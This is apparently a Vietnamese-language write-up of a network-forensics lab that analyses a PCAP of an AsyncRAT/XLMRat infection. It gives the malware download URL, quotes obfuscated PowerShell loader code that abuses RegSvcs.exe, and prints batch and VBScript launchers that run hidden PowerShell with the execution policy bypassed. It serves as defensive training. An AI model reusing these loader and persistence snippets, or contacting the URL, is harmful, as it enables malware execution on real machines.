author: Azaki
published: published
created: 2025-12-30
tags: CyberDefener, Lab, Network Forensics

A compromised machine has been flagged due to suspicious network traffic. Your task is to analyze the PCAP file to determine the attack method, identify any malicious payloads, and trace the timeline of events. Focus on how the attacker gained access, what tools or techniques were used, and how the malware operated post-compromise.

<hr>

<p style="text-align:right; font-style:italic;"> Author: <b>@Brad Duncan and ∑_01</b> </p>

## Q1: The attacker successfully executed a command to download the first stage of the malware. What is the URL from which the first malware stage was installed?

**Yêu cầu:** Xác định URL được sử dụng để tải malware stage xuống máy nạn nhân.

Bắt đầu bằng việc mở file PCAP trong **Wireshark** và lọc HTTP traffic:
```text
http
```

Trong traffic xuất hiện kết nối giữa máy nạn nhân `10.1.9.101` và remote server `45.126.209.4` qua TCP port `222`.

Khi kiểm tra HTTP response liên quan tới `mdm.jpg`, Wireshark hiển thị:
```text
Request URI: /mdm.jpg
Full request URI: http://45.126.209.4:222/mdm.jpg
```

![XLMRat Lab-1.png](./images/XLMRat%20Lab-1.png)

> [http://45.126.209.4:222/mdm.jpg](http://45.126.209.4:222/mdm.jpg)

## Q2: Which hosting provider owns the associated IP address?

**Yêu cầu:** Xác định hosting provider quản lý địa chỉ IP `45.126.209.4`.

Từ URL ở Q1, IOC cần pivot là:
```text
45.126.209.4
```

Có thể kiểm tra nhanh các endpoint trong Wireshark thông qua:
```text
Statistics → Endpoints → IPv4
```

Trong capture có ba địa chỉ IP chính:
```text
10.1.9.1
10.1.9.101
45.126.209.4
```

![XLMRat Lab-2.png](./images/XLMRat%20Lab-2.png)

Hai địa chỉ bắt đầu bằng `10.x.x.x` thuộc private address space, do đó IP public cần điều tra là `45.126.209.4`.

Sử dụng:
```bash
whois 45.126.209.4
```

WHOIS trả về netblock:
```text
45.126.208.0 - 45.126.211.255
```

với thông tin:
```text
netname: RELIABLESITE-AP
descr: ReliableSite.Net LLC
abuse-mailbox: abuse@reliablesite.net
```

![XLMRat Lab-3.png](./images/XLMRat%20Lab-3.png)

APNIC hiện cũng ghi nhận netblock này dưới organization `ReliableSite.Net LLC`.

> ReliableSite.Net

## Q3: By analyzing the malicious scripts, two payloads were identified: a loader and a secondary executable. What is the SHA256 of the malware executable?

**Yêu cầu:** Trích xuất executable được encode bên trong script và tính SHA256 của malware.

Sau khi lấy `mdm.jpg` từ HTTP stream, kiểm tra nội dung file cho thấy đây không đơn thuần là một ảnh. Script chứa hai biến hexadecimal đáng chú ý:
```powershell
$hexString_bbb
$hexString_pe
```

Trong đó dữ liệu hex được chia nhỏ bằng ký tự `_`.

Script tự chuyển các chuỗi này thành byte array:
```powershell
[Byte[]] $NKbb = $hexString_bbb -split '_' |
    ForEach-Object { [byte]([Convert]::ToInt32($_, 16)) }

[Byte[]] $pe = $hexString_pe -split '_' |
    ForEach-Object { [byte]([Convert]::ToInt32($_, 16)) }
```

Để phân tích `$hexString_bbb`, copy toàn bộ chuỗi vào **CyberChef** và thực hiện:
![XLMRat Lab-4.png](./images/XLMRat%20Lab-4.png)

Kết quả SHA256 là:
```text
1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798
```

Đây là hash của secondary executable mà câu hỏi yêu cầu.

> 1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798

## Q4: What is the malware family label based on Alibaba?

**Yêu cầu:** Xác định malware family mà engine của Alibaba gán cho executable vừa trích xuất.

Sử dụng SHA256 ở Q3 để tra cứu trên **VirusTotal**:
```text
1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798
```

Trong phần **Security vendors' analysis**, Alibaba nhận diện mẫu với detection dạng:
```text
Backdoor:MSIL/AsyncRat...
```

VirusTotal cũng hiển thị `asyncrat` trong Family labels.
![XLMRat Lab-5.png](./images/XLMRat%20Lab-5.png)

> AsyncRat

## Q5: What is the timestamp of the malware's creation?

**Yêu cầu:** Xác định creation timestamp của executable.

Tiếp tục ở VirusTotal, chuyển sang tab **Details** và tìm phần **History**.

Trường `Creation Time` hiển thị:
```text
2023-10-30 15:08:44 UTC
```

![XLMRat Lab-6.png](./images/XLMRat%20Lab-6.png)

Đây là timestamp được lấy từ metadata/PE information của mẫu.  **PE compilation/creation timestamp có thể bị attacker chỉnh sửa**, vì vậy trong một investigation thực tế không nên xem giá trị này là bằng chứng tuyệt đối về thời điểm malware thực sự được tạo.

> 2023-10-30 15:08

## Q6: Which LOLBin is leveraged for stealthy process execution in this script? Provide the full path.

**Yêu cầu:** Xác định Living-off-the-Land Binary được script sử dụng để proxy execution cho payload.

Tiếp tục phân tích nội dung `mdm.jpg`, có thể thấy path của executable bị obfuscate bằng cách chèn nhiều ký tự `#`.

Đoạn code đáng chú ý:
```powershell
$HM = 'L###############o################a#d' -replace '#', ''
$Fu = [Reflection.Assembly]::$HM($pe)

$NK = $Fu.GetType('N#ew#PE#2.P#E' -replace '#', '')
$MZ = $NK.GetMethod('Execute')

$NA = 'C:\W#######indow############s\Mi####cr' -replace '#', ''

$AC = $NA +
'osof#####t.NET\Fra###mework\v4.0.303###19\R##egSvc#####s.exe' -replace '#', ''

$VA = @($AC, $NKbb)
$CM = 'In###############vo##########ke' -replace '#', ''
$EY = $MZ.$CM($null, [object[]] $VA)
```

![XLMRat Lab-7.png](./images/XLMRat%20Lab-7.png)

Khi loại bỏ toàn bộ ký tự `#` và ghép hai phần của path:
```text
C:\Windows\Micr
+
osoft.NET\Framework\v4.0.30319\RegSvcs.exe
```

thu được:
```text
C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe
```

`RegSvcs.exe` là utility hợp lệ thuộc .NET Framework. Adversary có thể abuse `RegSvcs.exe` để proxy execution malicious code thông qua một trusted Windows binary.

MITRE ATT&CK mapping hành vi abuse `RegSvcs/RegAsm` vào:
```text
T1218.009 - System Binary Proxy Execution: Regsvcs/Regasm
```

> C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe

## Q7: The script is designed to drop several files. List the names of the files dropped by the script.

**Yêu cầu:** Xác định các file mà malicious script tạo trên hệ thống.

Tiếp tục đọc script trong `mdm.jpg` và tìm các lời gọi:
```powershell
[IO.File]::WriteAllText(...)
```

Đầu tiên script ghi PowerShell code vào:
```text
C:\Users\Public\Conted.ps1
```

Sau đó tạo một batch script:
```text
C:\Users\Public\Conted.bat
```

Nội dung `.bat` đáng chú ý:
```batch
set "ps=powershell.exe"
set "Contedms=-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass"
set "cmd=C:\Users\Public\Conted.ps1"

%ps% %Contedms% -Command "& '%cmd%'"
```

Batch file này chạy `Conted.ps1` với PowerShell ở chế độ hidden và sử dụng `ExecutionPolicy Bypass`.

Tiếp theo script tạo:
```text
C:\Users\Public\Conted.vbs
```

![XLMRat Lab-8.png](./images/XLMRat%20Lab-8.png)

VBScript sử dụng:
```vbscript
WScript.Shell
```

để chạy:
```text
C:\Users\Public\Conted.bat
```

với:
```text
visibility = 0
```
tức cửa sổ được chạy ở chế độ ẩn.

> Conted.ps1, Conted.bat, Conted.vbs

---

# ATTACK CHAIN

![XLMRat Lab.png](./images/XLMRat%20Lab.png)